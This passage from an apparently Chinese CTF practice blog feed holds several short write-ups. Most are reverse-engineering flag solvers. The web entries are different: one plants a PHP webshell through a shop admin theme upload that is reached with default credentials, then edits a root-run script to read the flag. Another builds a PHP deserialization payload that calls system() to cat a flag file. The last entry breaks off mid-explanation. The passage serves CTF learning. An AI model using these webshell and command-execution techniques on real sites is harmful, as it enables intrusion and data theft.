        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>以前做的题，忘了出处了</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-EasyRE/image-20210719220559117.png" alt="image-20210719220559117"></p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-EasyRE/image-20210719220554818.png" alt="image-20210719220554818"></p><p>这点注意。7F=127，转化字符串的时候截断了，所以字符串并不完整，需要加上后面的。<br>而且从后面也可以看出来，前面应该是一体的，再加上chr(127) 并没有这个字符，所以由此推断字符串是被截断了。</p><p>这点并没有什么实在的逻辑，更偏向于灵光一闪的想法。不要总是拘泥于1+1=2，也要留意观察其他。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">v <span class="token operator">=</span> <span class="token string">'xIrCj~&lt;r|2tWsv3PtI'</span>v <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">,</span> v<span class="token punctuation">)</span><span class="token punctuation">)</span>v<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">127</span><span class="token punctuation">)</span>v <span class="token operator">+=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">,</span> <span class="token string">'zndka'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>flag<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[tinyctf-2014]elrond32</title>
      <link href="/p/3359042898.html"/>
      <url>/p/3359042898.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>以前做的题</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-tinyctf-2014-elrond32/image-20210719220253732.png" alt="image-20210719220253732"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-tinyctf-2014-elrond32/image-20210719220301513.png" alt="image-20210719220301513"></p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>这题不难，理清逻辑就好，<br>空想想了半天，不如动笔在纸上写写。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-tinyctf-2014-elrond32/image-20210719220315205.png" alt="image-20210719220315205"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-tinyctf-2014-elrond32/image-20210719220319474.png" alt="image-20210719220319474"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-tinyctf-2014-elrond32/image-20210719220324453.png" alt="image-20210719220324453"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-tinyctf-2014-elrond32/image-20210719220328610.png" alt="image-20210719220328610"></p><p>简单简单，就是理清逻辑费时间，下次要加快思考速度了。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">n <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">)</span>v <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'i'</span><span class="token punctuation">,</span> <span class="token string">'e'</span><span class="token punctuation">,</span> <span class="token string">'n'</span><span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'g'</span><span class="token punctuation">,</span> <span class="token string">'s'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">def</span> <span class="token function">dd</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> flag    <span class="token keyword">if</span> i <span class="token keyword">not</span> <span class="token keyword">in</span> n<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"over"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token number">0</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">" "</span><span class="token punctuation">)</span>        flag <span class="token operator">+=</span> v<span class="token punctuation">[</span>n<span class="token punctuation">.</span>index<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">]</span>        <span class="token keyword">return</span> dd<span class="token punctuation">(</span><span class="token number">7</span><span class="token operator">*</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">11</span><span class="token punctuation">)</span>dd<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>t <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x0000000F</span><span class="token punctuation">,</span> <span class="token number">0x0000001F</span><span class="token punctuation">,</span> <span class="token number">0x00000004</span><span class="token punctuation">,</span> <span class="token number">0x00000009</span><span class="token punctuation">,</span> <span class="token number">0x0000001C</span><span class="token punctuation">,</span> <span class="token number">0x00000012</span><span class="token punctuation">,</span> <span class="token number">0x00000042</span><span class="token punctuation">,</span> <span class="token number">0x00000009</span><span class="token punctuation">,</span> <span class="token number">0x0000000C</span><span class="token punctuation">,</span> <span class="token number">0x00000044</span><span class="token punctuation">,</span> <span class="token number">0x0000000D</span><span class="token punctuation">,</span> <span class="token number">0x00000007</span><span class="token punctuation">,</span> <span class="token number">0x00000009</span><span class="token punctuation">,</span> <span class="token number">0x00000006</span><span class="token punctuation">,</span> <span class="token number">0x0000002D</span><span class="token punctuation">,</span> <span class="token number">0x00000037</span><span class="token punctuation">,</span>     <span class="token number">0x00000059</span><span class="token punctuation">,</span> <span class="token number">0x0000001E</span><span class="token punctuation">,</span> <span class="token number">0x00000000</span><span class="token punctuation">,</span> <span class="token number">0x00000059</span><span class="token punctuation">,</span> <span class="token number">0x0000000F</span><span class="token punctuation">,</span> <span class="token number">0x00000008</span><span class="token punctuation">,</span> <span class="token number">0x0000001C</span><span class="token punctuation">,</span> <span class="token number">0x00000023</span><span class="token punctuation">,</span> <span class="token number">0x00000036</span><span class="token punctuation">,</span> <span class="token number">0x00000007</span><span class="token punctuation">,</span> <span class="token number">0x00000055</span><span class="token punctuation">,</span> <span class="token number">0x00000002</span><span class="token punctuation">,</span> <span class="token number">0x0000000C</span><span class="token punctuation">,</span> <span class="token number">0x00000008</span><span class="token punctuation">,</span> <span class="token number">0x00000041</span><span class="token punctuation">,</span> <span class="token number">0x0000000A</span><span class="token punctuation">,</span> <span class="token number">0x00000014</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>t<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[XCTF-4th-WHCTF-2017]BABYRE</title>
      <link href="/p/2988976701.html"/>
      <url>/p/2988976701.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>以前做的题，整理下放blog上</p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-XCTF-4th-WHCTF-2017-BABYRE/20210326201322598_8856.png"></p><p>judge无法反编译，所以加过密或者有花指令</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-XCTF-4th-WHCTF-2017-BABYRE/20210326201500918_5365.png"><br>这里的0xCu的u是unsigned的意思<br>然后得找到judge函数的地址<br>有两种方法，1.动态调试/GDB；2.直接翻<br><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-XCTF-4th-WHCTF-2017-BABYRE/20210326202018083_6226.png"><br>7.0直接看到</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-XCTF-4th-WHCTF-2017-BABYRE/20210326202043985_12175.png"><br>7.5不显示这个函数，但可以直接跳转过去</p><p>或者把数组解密一下<br><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-XCTF-4th-WHCTF-2017-BABYRE/20210326234906342_12620-1626703087202.png"></p><p>然后依次按<br>U 取消定义<br>C 反汇编<br>P 生成函数</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-XCTF-4th-WHCTF-2017-BABYRE/20210327000418688_11093.png"></p><p>judge代码就出来了，不过这道题还是7.0版生成的伪代码漂亮点。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-XCTF-4th-WHCTF-2017-BABYRE/20210327000358991_5191.png"><br>flag{n1c3_j0b}</p>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[2019UNCTF]666</title>
      <link href="/p/453793400.html"/>
      <url>/p/453793400.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>挺简单的，考的逆向思维，我也做的来了。好耶</p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">enflag <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x69</span><span class="token punctuation">,</span> <span class="token number">0x7A</span><span class="token punctuation">,</span> <span class="token number">0x77</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0x72</span><span class="token punctuation">,</span> <span class="token number">0x6F</span><span class="token punctuation">,</span> <span class="token number">0x7A</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span>          <span class="token number">0x77</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0x76</span><span class="token punctuation">,</span> <span class="token number">0x2E</span><span class="token punctuation">,</span> <span class="token number">0x4B</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0x2E</span><span class="token punctuation">,</span> <span class="token number">0x4E</span><span class="token punctuation">,</span> <span class="token number">0x69</span><span class="token punctuation">,</span> <span class="token punctuation">]</span>flag <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">""</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">18</span>key <span class="token operator">=</span> <span class="token number">18</span>v3 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">32</span>v4 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">32</span>v5 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">40</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> key<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># v5[i] = enflag[i]</span>    <span class="token comment"># v4[i + 1] = enflag[i + 1]</span>    <span class="token comment"># v3[i + 2] = enflag[i + 2]</span>    flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>enflag<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> key<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">6</span>    flag<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>enflag<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">^</span> key<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">6</span>    flag<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>enflag<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">^</span> key<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">6</span>    <span class="token comment"># 加减优先级比异或要高</span><span class="token keyword">for</span> i <span class="token keyword">in</span> flag<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[GKCTF2020]老八小超市儿</title>
      <link href="/p/854902497.html"/>
      <url>/p/854902497.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GKCTF2020-%E8%80%81%E5%85%AB%E5%B0%8F%E8%B6%85%E5%B8%82%E5%84%BF/image-20210720193024786.png" alt="image-20210720193024786"></p><p>默认后台/admin.php<br>默认账户admin<br>默认密码shopxo</p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>进后台，这种第一时间考虑主题替换，<br>在网上下载了个主题，然后把一句话php扔进去</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GKCTF2020-%E8%80%81%E5%85%AB%E5%B0%8F%E8%B6%85%E5%B8%82%E5%84%BF/image-20210720193041439.png" alt="image-20210720193041439"></p><p>路径</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;c09edc10-f98b-46fc-bac8-474ba55b4e1b.node3.buuoj.cn&#x2F;public&#x2F;static&#x2F;index&#x2F;default&#x2F;images&#x2F;default-user-avatar.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>蚁剑访问</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;c09edc10-f98b-46fc-bac8-474ba55b4e1b.node3.buuoj.cn&#x2F;public&#x2F;static&#x2F;index&#x2F;default&#x2F;1.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>flag在/root处，但权限不够，没法提权。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GKCTF2020-%E8%80%81%E5%85%AB%E5%B0%8F%E8%B6%85%E5%B8%82%E5%84%BF/image-20210720193116374-1626780676838.png" alt="image-20210720193116374"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> io<span class="token keyword">import</span> timeos<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"whoami"</span><span class="token punctuation">)</span>gk1<span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>ctime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>gk<span class="token operator">=</span><span class="token string">"\nGet The RooT,The Date Is Useful!"</span>f<span class="token operator">=</span>io<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/flag.hint"</span><span class="token punctuation">,</span> <span class="token string">"rb+"</span><span class="token punctuation">)</span>f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>gk1<span class="token punctuation">)</span><span class="token punctuation">)</span>f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>gk<span class="token punctuation">)</span><span class="token punctuation">)</span>f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>加个一行</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">flag<span class="token operator">=</span>io<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/root/flag"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>结束</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[网鼎杯 2020 朱雀组]phpweb</title>
      <link href="/p/3140926844.html"/>
      <url>/p/3140926844.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>以前做的题</p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-phpweb/image-20210720191114494.png" alt="image-20210720191114494"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-phpweb/image-20210720191117805.png" alt="image-20210720191117805"></p><p>猜测使用了<code>call_user_func()</code></p><pre class="line-numbers language-none"><code class="language-none">$result &#x3D; call_user_func($func, $p);$func &#x3D; $_REQUEST[&quot;func&quot;];$p &#x3D; $_REQUEST[&quot;p&quot;];<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>读取源码<code>func=file_get_contents&amp;p=index.php</code></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-phpweb/image-20210720191215127.png" alt="image-20210720191215127"></p><p>反序列化可行</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-phpweb/image-20210720191226492.png" alt="image-20210720191226492"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&lt;</span>?php<span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">&#123;</span>    var $p <span class="token operator">=</span> <span class="token string">"/flag.php"</span><span class="token punctuation">;</span>    var $func <span class="token operator">=</span> <span class="token string">"readfile"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>$a <span class="token operator">=</span> new Test<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>echo serialize<span class="token punctuation">(</span>$a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#$a->p = 'ls ../../../';</span><span class="token comment">#$a->p ="find / -name 'flag*'";</span>$a<span class="token operator">-</span><span class="token operator">></span>p <span class="token operator">=</span> <span class="token string">'cat /tmp/flagoefiu4r93'</span><span class="token punctuation">;</span>$a<span class="token operator">-</span><span class="token operator">></span>func <span class="token operator">=</span> <span class="token string">'system'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> PHP代码审计 </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[安洵杯 2019]easy_serialize_php</title>
      <link href="/p/2255249959.html"/>
      <url>/p/2255249959.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[反序列化字符串逃逸]</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$function</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$filter_arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'php5'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'php4'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'fl1g'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'|'</span><span class="token punctuation">,</span><span class="token variable">$filter_arr</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'/i'</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">,</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"user"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'guest'</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'function'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$function</span><span class="token punctuation">;</span><span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$function</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;a href="index.php?f=highlight_file">source_code&lt;/a>'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img_path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'guest_img.png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img_path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$serialize_info</span> <span class="token operator">=</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'highlight_file'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'phpinfo'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'phpinfo();'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//maybe you can find something in here!</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'show_image'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$userinfo</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$serialize_info</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$userinfo</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><pre class="line-numbers language-none"><code class="language-none">extract($_POST); 直接把post里的键值对_SESSION[a]&#x3D;1，a&#x3D;1这种覆盖变量<span aria-hidden="true" 